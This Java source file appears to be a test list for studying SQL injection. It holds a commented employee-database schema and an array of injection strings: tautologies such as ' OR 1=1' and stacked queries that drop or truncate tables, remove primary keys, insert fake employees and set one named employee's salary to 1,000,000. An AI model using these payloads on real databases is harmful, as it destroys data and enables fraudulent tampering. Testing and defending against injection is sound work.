package statistics;

public class InjectionList 
{
//	CREATE TABLE EMPLOYEES (
//		    emp_no      INT             NOT NULL,
//		    birth_date  DATE            NOT NULL,
//		    first_name  VARCHAR(14)     NOT NULL,
//		    last_name   VARCHAR(16)     NOT NULL,
//		    gender      VARCHAR(2)  NOT NULL,    
//		    hire_date   DATE            NOT NULL,
//		    PRIMARY KEY (emp_no)
//		);
//
//		CREATE TABLE DEPARTMENTS (
//		    dept_no     CHAR(4)         NOT NULL,
//		    dept_name   VARCHAR(40)     NOT NULL,
//		    PRIMARY KEY (dept_no)
//		);
//
//		CREATE TABLE DEPT_MANAGER (
//		   dept_no      CHAR(4)         NOT NULL,
//		   emp_no       INT             NOT NULL,
//		   from_date    DATE            NOT NULL,
//		   to_date      DATE            NOT NULL,
//		   PRIMARY KEY (emp_no,dept_no)
//		); 
//
//		CREATE TABLE DEPT_EMP (
//		    emp_no      INT             NOT NULL,
//		    dept_no     CHAR(4)         NOT NULL,
//		    from_date   DATE            NOT NULL,
//		    to_date     DATE            NOT NULL,
//		    PRIMARY KEY (emp_no,dept_no)
//		);
//
//		CREATE TABLE TITLES (
//		    emp_no      INT             NOT NULL,
//		    title       VARCHAR(50)     NOT NULL,
//		    from_date   DATE            NOT NULL,
//		    to_date     DATE,
//		    PRIMARY KEY (emp_no,title, from_date)
//		); 
//
//		CREATE TABLE SALARIES (
//		    emp_no      INT             NOT NULL,
//		    salary      INT             NOT NULL,
//		    from_date   DATE            NOT NULL,
//		    to_date     DATE            NOT NULL,
//		    PRIMARY KEY (emp_no, from_date)
//		); 
//
//	
	public static String [] injections = 
	{
			" OR 1=1",
			" AND 1=1",
			"; DROP TABLE EMPLOYEES;--",
			"; DROP TABLE DEPT_MANAGER;--",
			"; TRUNCATE TABLE DEPT_MANAGER;--",
			"; UPDATE SALARIES SET salary = 1000000 WHERE emp_no = (SELECT emp_no FROM EMPLOYEES WHERE first_name = 'ALEX' AND last_name = 'WOODY');--",
			"; DELETE FROM TITLES WHERE emp_no = (SELECT emp_no FROM EMPLOYEES WHERE first_name = 'ALEX' AND last_name = 'WOODY');--",
			"; ALTER TABLE EMPLOYEES DROP PRIMARY KEY;--",
			"; ALTER TABLE EMPLOYEES DROP PRIMARY KEY; TRUNCATE TABLE DEPT_MANAGER; DROP TABLE EMPLOYEES;--",
			"; ALTER TABLE DEPT_MANAGER DROP PRIMARY KEY;--",
			"; INSERT INTO EMPLOYEES VALUES(153, 10/25/1234, 'WATERS','GENDRY', 'M', 1/15/2315);--",
			"; INSERT INTO EMPLOYEES VALUES(186, 10/25/1234, 'SNOW','JON', 'M', 1/15/1252); ALTER TABLE DEPT_MANAGER DROP PRIMARY KEY;--",
			"; INSERT INTO EMPLOYEES VALUES(186, 10/25/1234, 'SNOW','JON', 'M', 1/15/1252); ALTER TABLE DEPT_MANAGER DROP PRIMARY KEY; UPDATE SALARIES SET salary = 1000000 WHERE emp_no = (SELECT emp_no FROM EMPLOYEES WHERE first_name = 'ALEX' AND last_name = 'WOODY');--"
	};
}
